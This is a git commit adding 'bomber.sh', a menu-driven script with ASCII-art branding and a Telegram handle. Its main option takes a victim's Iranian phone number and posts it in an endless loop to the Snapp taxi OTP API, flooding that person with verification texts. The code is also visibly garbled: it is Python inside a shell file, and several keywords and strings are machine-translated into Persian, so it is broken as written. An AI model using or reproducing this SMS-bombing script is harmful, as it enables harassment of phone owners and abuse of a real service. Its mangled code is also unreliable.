7dd28b2a2684d00c2e529b3591939195c15393aa
mohammadmahdi <76968302+mrmahdi8800@users.noreply.github.com>
2021-03-20 16:05:39 +0330

    Create bomber.sh

---
+++ bomber.sh
@@ -0,0 +1,95 @@
+درخواستهای واردات
+
+red = "\ 033 [31m" green = "\ 033 [32m"
+
+blue = "\ 033 [36m"
+
+صورتی = "\ 033 [35 متر"
+
+rang = "\ 033 [34m"
+
+link = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
+
+os.system ("for i in {1..12}؛ do for j in $ (seq 1 $ i)؛ do echo -ne $ iÃ- $ j = $ ((i * j)) \\ t؛ done ؛ echo؛ done ")
+
+سیستم os ("پاک")
+
+چاپ (f "{red}")
+
+چاپ(" ، \ / ، ")
+
+چاپ(" / \ )\__/( / \ ")
+
+چاپ(" / \ (_\ /_) / \ ")
+
+چاپ(" ____/_____\__\@ @/___/_____\____ ")
+
+چاپ ("| | | \ ../ | | |")
+
+چاپ ("| \ VV / |")
+
+چاپ ("| mamoozesh \ / mrmahdi |")
+
+print("|_________________________________| ")
+
+print(" |    /\ /      \\        \ /\    | ")
+
+print(" |  /   V       ))        V   \  | ")
+
+print(" |/     °       //        °     \| ")
+
+print(" °              V                ° ")
+
+print(f"{pink} ")
+
+print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
+
+print(f"{blue} ")
+
+print("Telegram : @mamoozesh")
+
+print(f"{pink} ")
+
+print("∆ΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ∆")
+
+print(f"{green} ")
+
+print("|1|EliteBomb")
+
+print("|2|TestNet")
+
+print("|3|Exit")
+
+print(f"{rang} ")
+
+Elite = int(input("|∆|choose <>> : "))
+
+if Elite == 1:
+
+    number = input("please send number {9×××××××} : ")
+
+    while True:
+
+              requests.post(link,data={"cellphone":"+98"+number})
+
+              print("Successfully sended", number)
+
+elif Elite == 3:
+
+    os.system("clear")
+
+    os.system("figlet mamoozesh ")
+
+elif Elite == 2:
+
+    os.system("clear")
+
+    os.system("toilet mrmahdi")
+
+    os.system("pip install speedtest-cli")
+
+    os.system("speedtest-cli")
+
+elif Elite == 4:
+
+    os.system("telnet towel.blinkenlights.nl")
